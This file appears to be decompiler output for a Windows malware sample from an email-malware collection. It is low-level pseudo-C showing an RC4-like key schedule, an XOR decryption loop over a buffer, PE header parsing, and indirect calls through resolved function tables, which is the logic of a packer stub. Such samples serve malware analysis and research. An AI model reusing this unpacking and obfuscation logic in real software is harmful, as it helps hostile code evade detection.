// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0997/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401004(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 esi, word32 edi, selector fs)
{
	word32 edx_39 = edx + esi + esi + (fp + 0x00000010) + (fp + 0x00000010);
	word32 ecx_104;
	word32 ebx_105;
	word32 ebp_106;
	word32 edi_107;
	word32 eax_108 = fn004010CF(edx_39 + 0x7724F150, 0x00000000, ebx, ebp, edi, fs, dwLoc2C, 0x00000000, esi, out ecx_104, out ebx_105, out ebp_106, out edi_107);
	word32 ecx_112;
	word32 ebx_113;
	word32 ebp_114;
	word32 edi_115;
	fn004010CF(eax_108, ecx_104, ebx_105, ebp_106, edi_107, fs, ebp, dwArg14, dwArg20, out ecx_112, out ebx_113, out ebp_114, out edi_115);
	return;
}

word32 fn004010CF(word32 eax, word32 ecx, word32 ebx, word32 ebp, word32 edi, selector fs, word32 dwArg00, word32 dwArg18, word32 dwArg24, ptr32 ecxOut, ptr32 ebxOut, ptr32 ebpOut, ptr32 ediOut)
{
	word32 ecx_26 = DPB(ecx, Mem0[DPB(dwArg00, 0x0000, 0, 16):word16], 0, 16);
	word32 eax_39 = DPB(dwArg00, 0x0000, 0, 16);
	word32 ecx_61 = -(ecx_26 + 0x0000A5B2);
	word32 ebp_124 = ebp + 0x00000001;
	*ebpOut = ebp_124;
	Mem129[fp - 0x0000002C:word32] = fp - 0x00000028;
	word32 ebx_131;
	word32 eax_132 = fn004016A3(ebx, dwLoc30, out ebx_131);
	Mem140[fp + 0xFFFFFFE0:word32] = fp - 0x00000028;
	Mem142[fp + 0xFFFFFFDC:word32] = eax_132;
	Mem144[fp + 0xFFFFFFD8:word32] = eax_132;
	Mem147[fp + 0xFFFFFFD4:word32] = eax_132;
	Mem147[ebx_131 + 0x00000018:word32]();
	Mem147[ebx_131 + 0x0000001C:word32]();
	word16 si_173 = SEQ(fs, eax_132 + 0x00000004)[(eax_132 + 0x00000006) * 0x0008] + 0x0002;
	Mem181[fp + 0xFFFFFFD0:word32] = eax_132 + 0x00000006;
	Mem184[fp + 0xFFFFFFCC:word32] = eax_132 + 0x00000006;
	Mem184[ebx_131 + 0x00000000:word32]();
	Mem187[fp + 0x00000004:word32] = ebx_131;
	Mem189[fp + 0x00000008:word32] = DPB(0x00000002, si_173, 0, 16) - 0x00000001;
	Mem192[fp + 0xFFFFFFC8:word32] = ebx_131;
	word32 v18_197 = Mem192[fp + 0xFFFFFFC8:word32] - 0x00000004;
	Mem198[fp + 0xFFFFFFC8:word32] = v18_197;
	word32 edi_203 = Mem198[fp + 0xFFFFFFC8:word32];
	Mem207[fp + 0xFFFFFFC8:word32] = eax_132 + 0x00000006;
	Mem210[fp + 0xFFFFFFC4:word32] = ecx_61 + 0x00000001;
	Mem213[fp + 0xFFFFFFC0:word32] = fp + 0xFFFFFFC0;
	Mem216[fp + 0xFFFFFFBC:word32] = 0x00000040;
	Mem222[fp + 0xFFFFFFB8:word32] = Mem216[fp + 0xFFFFFFE8:word32];
	Mem224[fp + 0xFFFFFFB4:word32] = Mem222[fp + 0xFFFFFFDC:word32];
	Mem229[fp + 0xFFFFFFE4:word32] = 0x00000000;
	Mem231[fp + 0xFFFFFFB0:word32] = 0xFFFFFFFF;
	Mem231[edi_203 + 0x00000010:word32]();
	word32 eax_232 = eax_132 + 0x00000006 + Mem231[fs:eax_132 + 0x00000035:word32];
	Mem237[fp + 0xFFFFFFE0:word32] = Mem231[fp + 0xFFFFFFE0:word32] + Mem231[eax_232 + 0x00000003:word32];
	Mem240[fp + 0xFFFFFFAC:word32] = eax_232;
	Mem246[fp + 0xFFFFFFB0:word32] = Mem240[fp + 0xFFFFFFAC:word32];
	Mem252[fp + 0xFFFFFFB4:word32] = Mem246[fp + 0xFFFFFFB0:word32];
	word32 edi_255 = Mem252[fp + 0xFFFFFFB8:word32];
	Mem258[fp + 0xFFFFFFB8:word32] = Mem252[fp + 0xFFFFFFB4:word32];
	word32 eax_260 = Mem258[fp + 0xFFFFFFB8:word32];
	word32 ebx_265 = Mem258[fp + 0xFFFFFFBC:word32];
	*ebxOut = ebx_265;
	word32 esi_270 = Mem258[fp + 0xFFFFFFC0:word32];
	Mem275[fp + 0xFFFFFFC0:word32] = eax_260 + 0x00000002;
	Mem280[fp + 0xFFFFFFC0:word32] = Mem275[fp + 0xFFFFFFC0:word32] + 0x00000001;
	word32 eax_281 = Mem280[fp + 0xFFFFFFC0:word32];
	word32 ecx_283 = Mem280[eax_281 + 0x00000000:word32];
	Mem285[fp + 0xFFFFFFC0:word32] = eax_281;
	word32 eax_286 = Mem285[fp + 0xFFFFFFC0:word32];
	Mem289[fp + 0xFFFFFFEC:word32] = Mem285[fp + 0xFFFFFFEC:word32] ^ ecx_283;
	Mem292[fp + 0xFFFFFFC0:word32] = eax_286;
	Mem297[fp + 0xFFFFFFC0:word32] = Mem292[fp + 0xFFFFFFCC:word32];
	word32 ecx_300 = Mem297[fp + 0xFFFFFFDC:word32];
	*ecxOut = ecx_300;
	Mem304[fp + 0xFFFFFFC0:word32] = Mem297[fp + 0xFFFFFFC0:word32];
	Mem310[fp + 0xFFFFFEB8:word32] = Mem304[fp + 0xFFFFFFC0:word32];
	word32 eax_311 = Mem310[fp + 0xFFFFFEB8:word32];
	Mem313[fp + 0xFFFFFEBC:word32] = eax_311;
	Mem315[fp + 0xFFFFFEB8:word32] = eax_311;
	Mem319[fp + 0xFFFFFEC0:word32] = ecx_300;
	Mem321[fp + 0xFFFFFEB8:word32] = edi_255;
	Mem326[fp + 0xFFFFFEB4:word32] = 0x00000000;
	word32 eax_328 = Mem326[fp + 0xFFFFFEB4:word32];
	word32 esp_332 = fp + 0xFFFFFEB8 + 0x0000000C;
	do
	{
		word32 esp_336 = esp_332 - 0x00000004;
		Mem337[esp_336 + 0x00000000:word32] = eax_328;
		word32 eax_338 = Mem337[esp_336 + 0x00000000:word32];
		Mem341[esp_332 + 0x00000000 + eax_328:byte] = (byte) eax_338;
		Mem344[esp_336 + 0x00000000:word32] = eax_338;
		Mem349[esp_336 + 0x00000000:word32] = Mem344[esp_336 + 0x00000000:word32] + 0x00000001;
		word32 eax_350 = Mem349[esp_336 + 0x00000000:word32];
		Mem355[esp_336 + 0x00000000:word32] = eax_350;
		eax_328 = Mem355[esp_336 + 0x00000000:word32];
		esp_332 = esp_336 + 0x00000004;
	} while (eax_350 <u 0x00000100);
	Mem363[esp_336 + 0x00000000:word32] = eax_328;
	word32 edi_366 = Mem363[esp_336 + 0x00000004:word32];
	Mem369[esp_336 + 0x00000004:word32] = Mem363[esp_336 + 0x00000000:word32];
	Mem374[esp_336 + 0x00000004:word32] = esp_336 + 0x00000140;
	word32 eax_376 = Mem374[esp_336 + 0x00000004:word32];
	if (Mem374[eax_376 + 0x00000000:byte] != 0x79)
	{
		word32 edi_414;
		*ediOut = Mem374[eax_376 - 0x00000004:word32];
		Mem416[esp_336 + 0x00000004:word32] = eax_376;
		Mem422[esp_336 + 0x00000140:word32] = Mem416[esp_336 + 0x00000004:word32];
		return Mem422[esp_336 + 0x00000140:word32];
	}
	else
	{
		Mem431[esp_336 + 0x00000004:word32] = eax_376;
		word32 eax_432 = Mem431[esp_336 + 0x00000004:word32];
		Mem435[esp_336 + 0x00000004:word32] = ebp + 0x00000001;
		Mem437[esp_336 + 0x00000000:word32] = eax_432;
		word32 eax_438 = Mem437[esp_336 + 0x00000000:word32];
		Mem441[esp_336 + 0x00000000:word32] = esi_270;
		Mem443[esp_336 - 0x00000004:word32] = eax_438;
		word32 eax_445 = Mem443[esp_336 - 0x00000004:word32];
		Mem451[esp_336 - 0x00000004:word32] = edi_366;
		word32 edi_453 = Mem451[esp_336 + 0x00000120:word32];
		Mem455[esp_336 - 0x00000008:word32] = eax_445;
		Mem460[esp_336 - 0x00000008:word32] = 0x00000000;
		word32 eax_461 = Mem460[esp_336 - 0x00000008:word32];
		Mem466[esp_336 - 0x00000008:word32] = eax_461;
		Mem473[esp_336 - 0x00000008:word32] = Mem466[esp_336 - 0x00000008:word32];
		word32 eax_474 = Mem473[esp_336 - 0x00000008:word32];
		Mem477[esp_336 - 0x00000008:word32] = ebx_265;
		Mem479[esp_336 - 0x0000000C:word32] = eax_474;
		word32 esi_463 = eax_461;
		word32 ebp_469 = 0x00000000;
		word32 eax_481 = Mem479[esp_336 - 0x0000000C:word32];
		word32 esp_485 = esp_336 - 0x00000008;
		do
		{
			word32 ebx_496 = (word32) Mem479[esp_485 + 0x00000018 + ebp_469:byte];
			word32 esp_499 = esp_485 - 0x00000004;
			Mem500[esp_499 + 0x00000000:word32] = eax_481;
			word32 edx_503 = Mem500[esp_499 + 0x00000018:word32];
			Mem505[esp_499 + 0x00000000:word32] = Mem500[esp_499 + 0x00000000:word32];
			word32 eax_506 = Mem505[esp_499 + 0x00000000:word32];
			word32 edx_508 = (word32) Mem505[edx_503 + eax_506:byte];
			Mem512[esp_499 + 0x00000000:word32] = eax_506;
			word16 bx_497 = (word16) ebx_496;
			word32 eax_514 = Mem512[esp_499 + 0x00000000:word32];
			word32 ecx_522 = ebx_496 + esi_463;
			*ecxOut = ecx_522;
			Mem528[esp_499 + 0x00000000:word32] = eax_514;
			Mem534[esp_499 + 0x00000000:word32] = Mem528[esp_499 + 0x00000000:word32];
			Mem539[esp_499 + 0x00000000:word32] = Mem534[esp_499 + 0x00000000:word32] + 0x00000001;
			Mem545[esp_499 + 0x00000000:word32] = Mem539[esp_499 + 0x00000000:word32];
			word32 eax_546 = Mem545[esp_499 + 0x00000000:word32];
			Mem551[esp_499 + 0x00000000:word32] = eax_546;
			word32 edx_532 = DPB(edx_508 + ecx_522, 0x00, 8, 8);
			esi_463 = edx_532;
			word32 eax_553 = Mem551[esp_499 + 0x00000000:word32];
			word32 esp_557 = esp_499 + 0x00000004 + 0x00000018;
			if (eax_546 >=u edi_453)
			{
				Mem854[esp_499 + 0x00000000:word32] = eax_553;
				Mem861[esp_499 + 0x00000000:word32] = 0x00000000;
				eax_553 = Mem861[esp_499 + 0x00000000:word32];
				esp_557 = esp_499 + 0x00000004;
			}
			byte dl_562 = Mem551[esp_557 + 0x00000000 + edx_532:byte];
			word32 esp_563 = esp_557 - 0x00000004;
			Mem564[esp_563 + 0x00000000:word32] = eax_553;
			word32 eax_566 = Mem564[esp_563 + 0x00000000:word32];
			Mem571[esp_563 + 0x0000001C + ebp_469:byte] = dl_562;
			ebp_469 = ebp_469 + 0x00000001;
			Mem576[esp_563 + 0x00000000:word32] = eax_566;
			word32 eax_577 = Mem576[esp_563 + 0x00000000:word32];
			Mem582[esp_563 + 0x00000000:word32] = eax_577;
			word32 edx_579 = esp_563 + 0x0000001C + edx_532 - eax_577;
			word32 eax_583 = Mem582[esp_563 + 0x00000000:word32];
			word16 bx_586 = DPB(bx_497, Mem582[eax_583 + 0x00000001 + edx_579:byte], 8, 8);
			Mem588[esp_563 + 0x00000000:word32] = eax_583;
			word32 eax_589 = Mem588[esp_563 + 0x00000000:word32];
			Mem591[eax_589 + edx_579:word16] = bx_586;
			Mem593[esp_563 + 0x00000000:word32] = eax_589;
			Mem599[esp_563 + 0x00000000:word32] = Mem593[esp_563 + 0x00000000:word32];
			Mem606[esp_563 + 0x00000000:word32] = Mem599[esp_563 + 0x00000000:word32];
			Mem611[esp_563 + 0x00000000:word32] = Mem606[esp_563 + 0x00000000:word32];
			eax_481 = Mem611[esp_563 + 0x00000000:word32];
			esp_485 = esp_563 + 0x00000004;
		} while (SLICE(ebp_469, byte, 8) != 0x01);
		Mem619[esp_563 + 0x00000000:word32] = eax_481;
		word32 esi_623 = 0x00000000;
		word32 ebp_635 = Mem619[esp_563 + 0x00000130:word32];
		word32 edi_636 = Mem619[esp_563 + 0x00000014:word32];
		Mem639[esp_563 + 0x00000004:word32] = 0x00000000;
		Mem646[esp_563 + 0x00000004:word32] = Mem639[esp_563 + 0x00000004:word32];
		word32 eax_648 = Mem646[esp_563 + 0x00000004:word32];
		word32 esp_652 = esp_563 + 0x00000008;
		if (true)
		{
			Mem700[esp_563 + 0x00000004:word32] = eax_648;
			eax_648 = Mem700[esp_563 + 0x00000004:word32];
			esp_652 = esp_563 + 0x00000008;
			do
			{
				word32 esp_727 = esp_652 - 0x00000004;
				Mem728[esp_727 + 0x00000000:word32] = eax_648 + 0x00000001;
				Mem735[esp_727 + 0x00000000:word32] = DPB(Mem728[esp_727 + 0x00000000:word32], 0x00, 8, 8);
				word32 eax_737 = Mem735[esp_727 + 0x00000000:word32];
				byte cl_742 = Mem735[esp_727 + 0x00000018 + eax_737:byte];
				Mem754[esp_727 + 0x00000000:word32] = eax_737;
				Mem759[esp_727 + 0x00000000:word32] = Mem754[esp_727 + 0x00000000:word32];
				Mem767[esp_727 + 0x00000000:word32] = Mem759[esp_727 + 0x00000000:word32];
				Mem773[esp_727 + 0x00000000:word32] = Mem767[esp_727 + 0x00000000:word32];
				word32 ebx_763 = DPB((word32) cl_742 + esi_623, 0x00, 8, 8);
				byte dh_776 = Mem773[esp_727 + 0x00000004 + (ebx_763 + 0x00000014):byte];
				Mem779[esp_727 + 0x00000000:word32] = Mem773[esp_727 + 0x00000000:word32];
				word32 eax_780 = Mem779[esp_727 + 0x00000000:word32];
				Mem782[esp_727 + 0x00000018 + eax_780:byte] = dh_776;
				Mem784[esp_727 + 0x00000000:word32] = eax_780;
				word32 eax_785 = Mem784[esp_727 + 0x00000000:word32];
				Mem788[esp_727 + 0x00000000:word32] = eax_785;
				Mem790[esp_727 - 0x00000004:word32] = eax_785;
				Mem795[esp_727 - 0x00000004:word32] = esp_727 + 0x00000004 + (ebx_763 + 0x00000014);
				Mem799[Mem795[esp_727 - 0x00000004:word32]:byte] = cl_742;
				word32 eax_800 = Mem799[esp_727 + 0x00000000:word32];
				word32 edx_805 = (word32) dh_776;
				byte dl_807 = (byte) edx_805;
				word32 edx_809 = DPB(edx_805, dl_807 + cl_742, 0, 8);
				word32 ecx_815 = Mem799[esp_727 + 0x00000004 + (edx_809 + 0x00000014):word32];
				Mem817[esp_727 + 0x00000000:word32] = eax_800;
				word32 eax_819 = Mem817[esp_727 + 0x00000000:word32];
				word32 ecx_824;
				*ecxOut = ecx_815 << 0x00000008;
				word16 cx_825 = (word16) (ecx_815 << 0x00000008);
				esi_623 = ebx_763;
				Mem832[edi_636 - 0x00000001:word16] = Mem817[edi_636 - 0x00000001:word16] ^ cx_825;
				Mem836[esp_727 + 0x00000000:word32] = eax_819;
				Mem841[esp_727 + 0x00000000:word32] = Mem836[esp_727 + 0x00000000:word32];
				edi_636 = edi_636 + 0x00000001;
				eax_648 = Mem841[esp_727 + 0x00000000:word32];
				esp_652 = esp_727 + 0x00000004;
				ebp_635 = ebp_635 - 0x00000001;
			} while (ebp_635 != 0x00000000);
		}
		word32 edi_672;
		*ediOut = Mem646[esp_652 + 0x00000000:word32];
		word32 esp_673 = esp_652 + 0x00000004;
		Mem675[esp_673 - 0x00000004:word32] = eax_648;
		Mem681[esp_673 + 0x00000000:word32] = Mem675[esp_673 - 0x00000004:word32];
		word32 ebp_684;
		*ebpOut = Mem681[esp_673 + 0x00000004:word32];
		Mem687[esp_673 + 0x00000004:word32] = Mem681[esp_673 + 0x00000000:word32];
		word32 ebx_694;
		return fn004016CF(eax_39 + 0x00006C78, dwArg20, 0x00000000, out ebx_694);
	}
}

word32 fn00401227(word32 eax, word32 ebx, word32 dwArg04, ptr32 ecxOut, ptr32 ebxOut)
{
	word32 ecx_39 = Mem0[eax + Mem0[(Mem0[eax + 0x0000003C:word32] + eax) + 0x00000080:word32]:word32];
	*ecxOut = ecx_39;
	word32 eax_45 = eax + ecx_39;
	word32 ebx_50;
	*ebxOut = eax_45 + 0x00000004;
	return eax_45 + 0x00000004;
}

word32 fn004016A3(word32 ebx, word32 dwArg00, ptr32 ebxOut)
{
	word32 ebx_24;
	return fn004016CF(dwArg00, dwArg18, dwArg1C, out ebx_24);
}

void Yqjnrthndjj(word32 dwArg00, word32 dwArg04)
{
	fn004016BA();
	return;
}

void fn004016BA()
{
fn004016BA_entry:
l004016BA:
fn004016BA_exit:
}

word32 fn004016CF(word32 dwArg00, word32 dwArg24, word32 dwArg28, ptr32 ebxOut)
{
	esp = fp;
	eax = dwArg00;
	ax = (word16) eax;
	al = (byte) eax;
	esp = fp + 0x00000004;
	esp = fp + 0x0000002C;
	SCZO = cond(fp + 0x0000002C);
	esp = fp + 0x00000028;
	dwArg28 = eax;
	eax = dwArg28;
	esp = fp + 0x0000002C;
	esp = fp + 0x00000028;
	dwArg28 = eax;
	esp = fp + 0x00000024;
	dwArg24 = eax;
	eax = dwArg24;
	esp = fp + 0x00000028;
	ebx = edx;
	esp = fp + 0x00000024;
	dwArg24 = eax;
	ax = eax;
	eax = dwArg24;
	ax = (word16) eax;
	al = (byte) eax;
	esp = fp + 0x00000028;
	return eax;
}

